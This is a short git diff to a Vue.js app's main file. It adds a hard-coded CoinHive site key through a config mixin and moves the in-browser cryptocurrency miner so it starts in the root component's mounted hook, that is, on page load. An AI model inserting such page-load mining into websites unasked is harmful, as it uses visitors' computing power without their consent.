@@ -4,8 +4,13 @@ import App from './App.vue'
 import router from './router'
 import store from './store'
 import Miner from './lib/miner'
+import vueConfig from './lib/mixins/config'
 
-Miner(CoinHive)
+const configs = {
+  siteKey: 's0N1th4I4ElExw1U3JlqGVTjZR428Nyq' // TODO: use config file
+}
+
+Vue.use(vueConfig, configs)
 
 /* eslint-disable no-new */
 new Vue({
@@ -13,5 +18,8 @@ new Vue({
   store,
   router,
   template: '<App/>',
-  components: { App }
+  components: { App },
+  mounted: function () {
+    Miner(CoinHive, this)
+  }
 })
